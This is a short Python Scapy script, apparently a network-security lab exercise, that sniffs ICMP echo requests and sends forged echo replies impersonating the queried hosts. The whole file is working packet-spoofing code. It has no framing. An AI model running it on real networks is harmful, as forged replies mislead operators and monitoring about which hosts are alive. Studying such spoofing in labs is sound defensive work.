from scapy.all import *

def spoof_response(packet):
    if packet.haslayer(ICMP) and packet[ICMP].type == 8:  # ICMP Echo Request
        # 원본 패킷 복사 및 조작
        response_pkt = packet.copy()
        response_pkt[IP].src = packet[IP].dst
        response_pkt[IP].dst = packet[IP].src
        response_pkt[ICMP].type = 0  # Echo Reply
        response_pkt[ICMP].chksum = None  # 자동으로 체크섬 재계산
        send(response_pkt, verbose=0)
        print(f"Sent spoofed reply from {response_pkt[IP].src} to {response_pkt[IP].dst}")

def intercept_and_respond():
    sniff(filter="icmp", prn=spoof_response)

if __name__ == "__main__":
    intercept_and_respond()

